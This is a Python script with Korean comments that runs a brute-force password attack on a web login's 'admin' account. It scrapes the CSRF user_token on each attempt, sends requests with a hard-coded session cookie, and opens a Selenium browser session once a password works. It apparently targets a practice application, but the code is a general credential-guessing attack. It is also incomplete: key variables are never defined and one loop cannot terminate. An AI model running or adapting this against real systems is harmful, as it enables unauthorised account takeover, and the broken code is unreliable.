


from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time
import random
import string
from _ast import If
import urllib           
import urllib.parse     
import urllib.request   
import requests 


list1=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
      ,"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

list2=['~','!','@','$','%','^','&','*','(',')','-','_','=','+','|','/',"\'","\\",'<','>','?',',','.',"\""]
#자리잡고
li3=["1","2","3","4","5","6","7","8","9","0"]
li4=[]
w=True
while (w==True):
    if (q==1):
        li4=list1
        w=False
    elif (q==2):
        li4=list1+list2
        w=False
    elif (q==3):
        li4=list1+li3
        w=False
    elif (q==4):
        li4=list1+list2+li3
        w=False
    else:
        print("입력 외의 값입니다\n지정된 값 중에서 골라주세요\n")
        w=True


list3=[]
list4=[]
for i in range(A):
    list3.append(list1[0])
 
#문자가 1자 일때
def fir0(x):
    list4=[]
    x=-x
    for i2 in range(len(li4)):
        list3[x]=li4[i2]
        list4.append("".join(list3))
        url = D
        cookies={"PHPSESSID":"7lk7rdnskge95a6m6o8movv90j"}
        res = requests.get(url, cookies=cookies)      
        search_string = "name='user_token' value= "
        string_position = res.text.find(search_string)
        search_position = string_position+len(search_string)
        if string_position > 0:
            token = res.text[search_position:res.text.find(" /", search_position)] 
        payload = {'username':'admin',
                 'password':list4[0]
                 ,'Login':'Login'
                 ,'user_token':token}
        r = requests.get(url,payload)
        if(r.text.find("Congratulations") > 0):
            print("사용된 유저토큰: "+token)
            print("공격성공 비밀번호는 "+list4[0]+"\n")
            driver = webdriver.Chrome(ChromeDriverManager().install())
            driver.get(D)
            id = driver.find_element_by_name('username')
            id.send_keys("admin")
            pw = driver.find_element_by_name('password')
            pw.send_keys(list4[0])
            Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
            Search.click()
            driver.wait()
            driver.quit()
            break
        else : 
            print("사용된 유저토큰: "+token)
            print("암호실패!! 공격하는 문자: "+list4[0]+"\n")
            list4=[]      
